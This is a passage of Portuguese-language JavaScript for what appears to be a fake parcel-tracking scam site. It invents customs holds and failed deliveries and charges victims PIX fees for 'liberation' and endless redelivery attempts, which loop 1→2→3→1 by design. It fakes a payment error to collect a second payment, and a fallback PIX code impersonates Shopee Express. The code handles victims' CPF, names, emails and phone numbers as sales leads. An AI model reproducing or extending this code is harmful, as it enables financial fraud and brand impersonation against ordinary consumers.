            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-truck" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${attemptNumber}ª tentativa liberada.</div>
            </div>
        `;

        document.body.appendChild(notification);

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    // Iniciar fluxo de entrega após pagamento
    startDeliveryFlow(attemptNumber) {
        console.log(`🚚 Iniciando fluxo de entrega da ${attemptNumber}ª tentativa`);
        
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const deliverySteps = [
            {
                title: 'Pedido sairá para entrega',
                description: 'Seu pedido está sendo preparado para entrega',
                delay: 2 * 60 * 1000 // 2 minutos
            },
            {
                title: 'Pedido em trânsito',
                description: 'Pedido em trânsito para seu endereço',
                delay: 2 * 60 * 60 * 1000 // 2 horas
            },
            {
                title: 'Pedido em rota para seu destino',
                description: 'Pedido em rota para seu destino, aguarde',
                delay: 2 * 60 * 60 * 1000 // 2 horas
            },
            {
                title: 'Nova tentativa de entrega',
                description: 'Nova tentativa de entrega será realizada',
                delay: 30 * 60 * 1000, // 30 minutos
                isNewAttempt: true
            }
        ];

        deliverySteps.forEach((step, index) => {
            setTimeout(() => {
                const stepDate = new Date();
                const timelineItem = this.createTimelineItem({
                    id: 200 + (attemptNumber * 10) + index,
                    date: stepDate,
                    title: step.title,
                    description: step.description,
                    isChina: false,
                    completed: true,
                    needsLiberation: false,
                    isDeliveryAttempt: step.isNewAttempt,
                    deliveryValue: step.isNewAttempt ? this.deliveryValues[(attemptNumber) % this.deliveryValues.length] : null,
                    attemptNumber: step.isNewAttempt ? attemptNumber + 1 : null
                }, false);

                timeline.appendChild(timelineItem);

                setTimeout(() => {
                    timelineItem.style.opacity = '1';
                    timelineItem.style.transform = 'translateY(0)';
                }, 100);

                timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });

                // Se for nova tentativa, incrementar contador
                if (step.isNewAttempt) {
                    this.deliveryAttempts++;
                    const nextValue = this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length];
                    this.updateCurrentStatus(`${this.deliveryAttempts + 1}ª Tentativa de Entrega (Aguardando Pagamento)`);
                    console.log(`🔄 Próxima tentativa configurada: ${this.deliveryAttempts + 1}ª - R$ ${nextValue.toFixed(2)}`);
                }

            }, step.delay);
        });
    }

    // Fechar modal de pagamento de entrega
    closeDeliveryPaymentModal() {
        const modal = document.getElementById('deliveryPaymentModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    // Nova função: Abrir modal de tentativa de entrega
    async openDeliveryModal(attemptNumber, value, buttonElement) {
        console.log(`🚚 Abrindo modal de ${attemptNumber}ª tentativa de entrega - R$ ${value.toFixed(2)}`);

        // Mostrar loading
        UIHelpers.showLoadingNotification();

        try {
            // Gerar PIX via Zentra Pay
            const userData = {
                nome: this.leadData?.nome_completo || this.userData?.nome || 'Cliente',
                cpf: this.leadData?.cpf || this.currentCPF || '00000000000',
                email: this.leadData?.email || 'cliente@email.com',
                telefone: this.leadData?.telefone || '11999999999'
            };

            console.log('📡 Gerando PIX para tentativa de entrega:', { userData, value });

            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);

            UIHelpers.closeLoadingNotification();

            if (pixResult.success) {
                console.log('✅ PIX de entrega gerado com sucesso');
                this.showDeliveryPaymentModal(attemptNumber, value, pixResult, buttonElement);
            } else {
                throw new Error(pixResult.error || 'Erro ao gerar PIX');
            }

        } catch (error) {
            console.error('❌ Erro ao gerar PIX de entrega:', error);
            UIHelpers.closeLoadingNotification();
            
            // Mostrar modal estático como fallback
            this.showDeliveryPaymentModal(attemptNumber, value, null, buttonElement);
        }
    }

    showDeliveryPaymentModal(attemptNumber, value, pixData, buttonElement) {
        // Criar modal de pagamento de entrega
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPaymentModal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        // QR Code e PIX
        let qrCodeSrc, pixPayload;
        if (pixData && pixData.pixPayload) {
            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixPayload)}`;
            pixPayload = pixData.pixPayload;
        } else {
            // Fallback estático
            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
        }

        const customerName = this.leadData?.nome_completo || this.userData?.nome || 'Cliente';

        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">${attemptNumber}ª Tentativa de Entrega</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            <strong>${customerName}</strong>, para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de <strong>R$ ${value.toFixed(2)}</strong>.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}ª Tentativa</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Entrega" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div style="text-align: center; margin-top: 20px;">
                            <button id="simulateDeliveryPaymentButton" style="
                                background: transparent;
                                color: #666;
                                border: 1px solid #ddd;
                                padding: 6px 12px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-weight: 600;
                                transition: all 0.3s ease;
                                opacity: 0.7;
                                font-size: 12px;
                                min-width: 30px;
                                height: 28px;
                            ">
                                -
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';

        // Configurar eventos
        this.setupDeliveryModalEvents(modal, attemptNumber, buttonElement);
    }

    setupDeliveryModalEvents(modal, attemptNumber, buttonElement) {
        // Botão fechar
        const closeButton = modal.querySelector('#closeDeliveryPaymentModal');
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryModal();
            });
        }

        // Botão copiar
        const copyButton = modal.querySelector('#copyDeliveryPixButton');
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        // Botão de simulação
        const simulateButton = modal.querySelector('#simulateDeliveryPaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulateDeliveryPayment(attemptNumber, buttonElement);
            });
        }

        // Fechar ao clicar fora
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryModal();
            }
        });
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.getElementById('copyDeliveryPixButton');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    this.showCopySuccess(copyButton);
                });
            } else {
                document.execCommand('copy');
                this.showCopySuccess(copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    simulateDeliveryPayment(attemptNumber, buttonElement) {
        console.log(`💳 Simulando pagamento da ${attemptNumber}ª tentativa de entrega`);
        
        // Fechar modal
        this.closeDeliveryModal();
        
        // Ocultar botão atual
        if (buttonElement) {
            buttonElement.style.display = 'none';
        }
        
        // Mostrar notificação de sucesso
        this.showDeliverySuccessNotification(attemptNumber);
        
        // Iniciar próximo ciclo de entrega
        setTimeout(() => {
            this.startNextDeliveryCycle(attemptNumber);
        }, 2000);
    }

    showDeliverySuccessNotification(attemptNumber) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${attemptNumber}ª tentativa reagendada.</div>
            </div>
        `;

        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 5000);
    }

    startNextDeliveryCycle(completedAttempt) {
        console.log(`🔄 Iniciando próximo ciclo após ${completedAttempt}ª tentativa`);
        
        // Determinar próxima tentativa (loop infinito: 1→2→3→1→2→3...)
        const nextAttempt = completedAttempt >= 3 ? 1 : completedAttempt + 1;
        const nextStageId = this.getNextDeliveryStageId(nextAttempt);
        
        console.log(`📦 Próxima tentativa será: ${nextAttempt}ª (Stage ID: ${nextStageId})`);
        
        // Etapas do ciclo de entrega
        const deliveryCycle = [
            { id: nextStageId - 3, title: 'Pedido sairá para entrega', delay: 0 },
            { id: nextStageId - 2, title: 'Pedido em trânsito para entrega', delay: 2 * 60 * 1000 }, // 2 min
            { id: nextStageId - 1, title: 'Pedido em rota de entrega', delay: 4 * 60 * 1000 }, // 4 min  
            { id: nextStageId, title: `${nextAttempt}ª Tentativa de entrega`, delay: 6 * 60 * 1000, hasDeliveryButton: true } // 6 min
        ];
        
        // Executar etapas com delays
        deliveryCycle.forEach((stage) => {
            setTimeout(() => {
                this.addDeliveryStage(stage);
            }, stage.delay);
        });
    }

    getNextDeliveryStageId(attemptNumber) {
        const stageMap = {
            1: 16,   // 1ª tentativa
            2: 106,  // 2ª tentativa
            3: 116   // 3ª tentativa
        };
        return stageMap[attemptNumber] || 16;
    }

    closeDeliveryModal() {
        const modal = document.getElementById('deliveryPaymentModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    async updateLeadStageInDatabase(newStage) {
        if (this.currentCPF) {
            try {
                await this.dbService.updateLeadStage(this.currentCPF, newStage);
                console.log(`✅ Etapa atualizada no banco: ${newStage}`);
            } catch (error) {
                console.error('❌ Erro ao atualizar etapa:', error);
            }
        }
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (!liberationButton) return;
        
        UIHelpers.scrollToElement(liberationButton, window.innerHeight / 2);
        
        setTimeout(() => {
            liberationButton.style.animation = 'pulse 2s infinite, glow 2s ease-in-out';
            liberationButton.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.8)';
            
            setTimeout(() => {
                liberationButton.style.animation = 'pulse 2s infinite';
                liberationButton.style.boxShadow = '0 4px 15px rgba(255, 107, 53, 0.4)';
            }, 6000);
        }, 500);
    }

    setupModalEvents() {
        const closeModal = document.getElementById('closeModal');
        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeModal('liberationModal');
            });
        }

        const closeDeliveryModal = document.getElementById('closeDeliveryModal');
        if (closeDeliveryModal) {
            closeDeliveryModal.addEventListener('click', () => {
                this.closeModal('deliveryModal');
            });
        }

        ['liberationModal', 'deliveryModal'].forEach(modalId => {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.addEventListener('click', (e) => {
                    if (e.target.id === modalId) {
                        this.closeModal(modalId);
                    }
                });
            }
        });
    }

    setupCopyButtons() {
        const copyButtons = [
            { buttonId: 'copyPixButtonModal', inputId: 'pixCodeModal' },
            { buttonId: 'copyPixButtonDelivery', inputId: 'pixCodeDelivery' }
        ];

        copyButtons.forEach(({ buttonId, inputId }) => {
            const button = document.getElementById(buttonId);
            if (button) {
                button.addEventListener('click', () => {
                    this.copyPixCode(inputId, buttonId);
                });
            }
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => {
                this.toggleAccordion();
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeModal('liberationModal');
                this.closeModal('deliveryModal');
                UIHelpers.closeLoadingNotification();
            }
        });
    }

    async openLiberationModal() {
        console.log('🚀 Iniciando processo de geração de PIX com dados reais do banco...');
        UIHelpers.showLoadingNotification();

        try {
            if (!this.zentraPayService.validateApiSecret()) {
                throw new Error('API Secret do Zentra Pay não configurada corretamente');
            }

            const value = window.valor_em_reais || 26.34;
            console.log('💰 Valor da transação:', `R$ ${value.toFixed(2)}`);
            
            // Usar dados REAIS do banco
            const userData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };
            
            console.log('👤 Dados REAIS do banco para pagamento:', {
                nome: userData.nome,
                cpf: userData.cpf,
                email: userData.email,
                telefone: userData.telefone
            });

            console.log('📡 Enviando requisição para Zentra Pay com dados reais...');
            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);

            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso usando dados reais do banco!');
                console.log('📋 Dados recebidos:', {
                    transactionId: pixResult.transactionId,
                    externalId: pixResult.externalId,
                    pixPayload: pixResult.pixPayload
                });

                this.pixData = pixResult;
                UIHelpers.closeLoadingNotification();
                
                setTimeout(() => {
                    this.displayRealPixModal();
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro desconhecido ao gerar PIX');
            }
        } catch (error) {
            console.error('💥 Erro ao gerar PIX:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError(`Erro ao gerar PIX: ${error.message}`);
            
            setTimeout(() => {
                console.log('⚠️ Exibindo modal estático como fallback');
                this.displayStaticPixModal();
            }, 1000);
        }
    }

    showPaymentError() {
        this.paymentErrorShown = true;
        
        const errorOverlay = document.createElement('div');
        errorOverlay.id = 'paymentErrorOverlay';
        errorOverlay.className = 'modal-overlay';
        errorOverlay.style.display = 'flex';
        
        errorOverlay.innerHTML = `
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(errorOverlay);
        document.body.style.overflow = 'hidden';

        const closeButton = document.getElementById('closePaymentErrorModal');
        const retryButton = document.getElementById('retryPaymentButton');

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }

        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                this.openLiberationModal();
            });
        }

        errorOverlay.addEventListener('click', (e) => {
            if (e.target === errorOverlay) {
                this.closePaymentErrorModal();
            }
        });
    }

    closePaymentErrorModal() {
        const errorOverlay = document.getElementById('paymentErrorOverlay');
        if (errorOverlay) {
            errorOverlay.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorOverlay.parentNode) {
                    errorOverlay.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    displayRealPixModal() {
        console.log('🎯 Exibindo modal com dados reais do PIX...');

        const qrCodeImg = document.getElementById('realPixQrCode');
        if (qrCodeImg && this.pixData.pixPayload) {
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
            qrCodeImg.src = qrCodeUrl;
            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
            console.log('✅ QR Code atualizado com dados reais da API oficial');
        }

        const pixInput = document.getElementById('pixCodeModal');
        if (pixInput && this.pixData.pixPayload) {
            pixInput.value = this.pixData.pixPayload;
            console.log('✅ Código PIX Copia e Cola atualizado com dados reais da API oficial');
        }

        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            console.log('🎯 Modal PIX real exibido com sucesso');
            
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }

        console.log('🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!');
    }

    addPaymentSimulationButton() {
        const modalContent = document.querySelector('.professional-modal-content');
        if (!modalContent || document.getElementById('simulatePaymentButton')) return;

        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `;

        buttonContainer.innerHTML = `
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `;

        modalContent.appendChild(buttonContainer);

        const simulateButton = document.getElementById('simulatePaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulatePayment();
            });

            simulateButton.addEventListener('mouseenter', function() {
                this.style.background = 'rgba(0, 0, 0, 0.05)';
                this.style.transform = 'translateY(-1px)';
                this.style.opacity = '1';
            });

            simulateButton.addEventListener('mouseleave', function() {
                this.style.background = 'transparent';
                this.style.transform = 'translateY(0)';
                this.style.opacity = '0.7';
            });
        }
    }

    simulatePayment() {
        this.closeModal('liberationModal');
        this.paymentRetryCount++;
        
        if (this.paymentRetryCount === 1) {
            // Primeira tentativa - mostrar erro
            setTimeout(() => {
                this.showPaymentError();
            }, 1000);
        } else {
            // Segunda tentativa - sucesso
            this.paymentRetryCount = 0;
            this.processSuccessfulPayment();
        }
    }

    async processSuccessfulPayment() {
        if (this.trackingData) {
            this.trackingData.liberationPaid = true;
        }

        // Atualizar no banco
        if (this.leadData) {
            await this.updatePaymentStatusInDatabase('pago');
        }

        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            liberationButton.style.display = 'none';
        }

        this.showSuccessNotification();

        // Iniciar fluxo de entrega após pagamento da taxa alfandegária
        setTimeout(() => {
            this.startDeliveryFlow();
        }, 1000);
    }

    startDeliveryFlow() {
        console.log('🚚 Iniciando fluxo de entrega após liberação alfandegária...');
        
        // Inicializar sistema de entrega se não existir
        if (!this.deliverySystem) {
            this.deliverySystem = new DeliveryFlowSystem(this);
        }
        
        // Iniciar fluxo de entrega
        this.deliverySystem.startDeliveryFlow();
    }

    // Adicionar etapas pós-pagamento
    addPostPaymentSteps() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        console.log('🚀 Iniciando fluxo de entrega pós-pagamento...');
        const postPaymentSteps = [12, 13, 14, 15, 16, 17]; // Incluir etapa 17 (1ª tentativa)
        const postPaymentStages = [
            { id: 12, title: 'Pedido liberado na alfândega de importação', delay: 0 },
            { id: 13, title: 'Pedido sairá para entrega', delay: 2 * 60 * 1000 }, // 2 minutos
            { id: 14, title: 'Pedido em trânsito para entrega', delay: 2 * 60 * 60 * 1000 }, // 2 horas
            { id: 15, title: 'Pedido em rota de entrega', delay: 4 * 60 * 60 * 1000 }, // 4 horas
            { id: 16, title: '1ª Tentativa de entrega', delay: 6 * 60 * 60 * 1000, hasDeliveryButton: true } // 6 horas
        ];

        postPaymentStages.forEach((stage, index) => {
            setTimeout(() => {
                this.addDeliveryStage(stage);
            }, stage.delay);
        });
    }

    addDeliveryStage(stage) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const now = new Date();
        const timelineItem = this.createTimelineItem({
            id: stage.id,
            date: now,
            title: stage.title,
            description: stage.title,
            isChina: false,
            completed: true,
            hasDeliveryButton: stage.hasDeliveryButton
        }, stage.id === 16);

        timeline.appendChild(timelineItem);

        // Animar entrada
        setTimeout(() => {
            timelineItem.style.opacity = '1';
            timelineItem.style.transform = 'translateY(0)';
        }, 100);

        // Scroll para nova etapa
        timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });

        console.log(`✅ Etapa adicionada: ${stage.title}`);

        // Atualizar etapa no banco de dados
        this.updateLeadStageInDatabase(stage.id);
    }

    async updatePaymentStatusInDatabase(status) {
        if (!this.currentCPF) return;

        try {
            // Update in localStorage
            const leads = JSON.parse(localStorage.getItem('leads') || '[]');
            const leadIndex = leads.findIndex(l => l.cpf && l.cpf.replace(/[^\d]/g, '') === this.currentCPF);
            
            if (leadIndex !== -1) {
                leads[leadIndex].status_pagamento = status;
                leads[leadIndex].etapa_atual = 12; // Etapa liberado
                leads[leadIndex].updated_at = new Date().toISOString();
                localStorage.setItem('leads', JSON.stringify(leads));
                console.log('✅ Status de pagamento atualizado no localStorage:', status);
            }
        } catch (error) {
            console.error('❌ Erro ao atualizar status no localStorage:', error);
        }
    }

    showSuccessNotification() {
        const notification = document.createElement('div');
        notification.className = 'payment-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `;

        document.body.appendChild(notification);

        if (!document.getElementById('notificationAnimations')) {
            const style = document.createElement('style');
            style.id = 'notificationAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    displayStaticPixModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }
        
        console.log('⚠️ Modal PIX estático exibido como fallback');
    }

    guideToCopyButton() {
        const copyButton = document.getElementById('copyPixButtonModal');
        const pixSection = document.querySelector('.pix-copy-section');
        
        if (!copyButton || !pixSection) return;

        pixSection.style.position = 'relative';
        
        const guide = document.createElement('div');
        guide.className = 'copy-guide-indicator';
        guide.innerHTML = '👆 Copie o código PIX aqui';
        guide.style.cssText = `
            position: absolute;
            top: -35px;
            right: 0;
            background: #ff6b35;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
            z-index: 10;
            white-space: nowrap;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
        `;

        pixSection.appendChild(guide);
        pixSection.style.animation = 'highlightSection 3s ease';

        setTimeout(() => {
            pixSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 200);

        setTimeout(() => {
            if (guide.parentNode) {
                guide.remove();
            }
            pixSection.style.animation = '';
        }, 6000);
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    toggleAccordion() {
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');
        
        if (!detailsContent || !toggleIcon) return;

        if (detailsContent.classList.contains('expanded')) {
            detailsContent.classList.remove('expanded');
            toggleIcon.classList.remove('rotated');
        } else {
            detailsContent.classList.add('expanded');
            toggleIcon.classList.add('rotated');
        }
    }

    copyPixCode(inputId, buttonId) {
        const input = document.getElementById(inputId);
        const button = document.getElementById(buttonId);
        
        if (!input || !button) return;

        try {
            input.select();
            input.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(input.value).then(() => {
                    console.log('✅ PIX copiado via Clipboard API:', input.value.substring(0, 50) + '...');
                    this.showCopySuccess(button);
                }).catch(() => {
                    this.fallbackCopy(input, button);
                });
            } else {
                this.fallbackCopy(input, button);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
            UIHelpers.showError('Erro ao copiar código PIX. Tente selecionar e copiar manualmente.');
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand:', input.value.substring(0, 50) + '...');
                this.showCopySuccess(button);
            } else {
                throw new Error('execCommand falhou');
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
            UIHelpers.showError('Erro ao copiar. Selecione o texto e use Ctrl+C.');
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    handleAutoFocus() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('focus') === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    const trackingHero = document.querySelector('.tracking-hero');
                    if (trackingHero) {
                        UIHelpers.scrollToElement(trackingHero, 0);
                    }
                    
                    setTimeout(() => {
                        cpfInput.focus();
                        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                            cpfInput.setAttribute('inputmode', 'numeric');
                            cpfInput.setAttribute('pattern', '[0-9]*');
                            cpfInput.click();
                        }
                    }, 800);
                }
            }, 100);

            const currentPath = window.location.pathname;
            window.history.replaceState({}, document.title, currentPath);
        }
    }

    clearOldData() {
        try {
            const keys = Object.keys(localStorage);
            keys.forEach(key => {
                if (key.startsWith('tracking_')) {
                    localStorage.removeItem(key);
                }
            });
        } catch (error) {
            console.error('Erro ao limpar dados antigos:', error);
        }
    }

    saveTrackingData() {
        if (!this.currentCPF || !this.trackingData) return;
        
        try {
            localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
        } catch (error) {
            console.error('Erro ao salvar dados:', error);
        }
    }

    getFirstAndLastName(fullName) {
        const nameParts = fullName.trim().split(' ');
        console.log('🔍 Processando nome completo:', fullName);
        console.log('🔍 Nomes separados:', nameParts);
        
        if (nameParts.length === 1) {
            console.log('✅ Nome único encontrado:', nameParts[0]);
            return nameParts[0];
        }
        
        const result = `${nameParts[0]} ${nameParts[nameParts.length - 1]}`;
        console.log('✅ Nome processado:', result);
        return result;
    }

    updateElement(elementId, text) {
        console.log(`🔄 Tentando atualizar elemento '${elementId}' com texto:`, text);
        
        const element = document.getElementById(elementId);
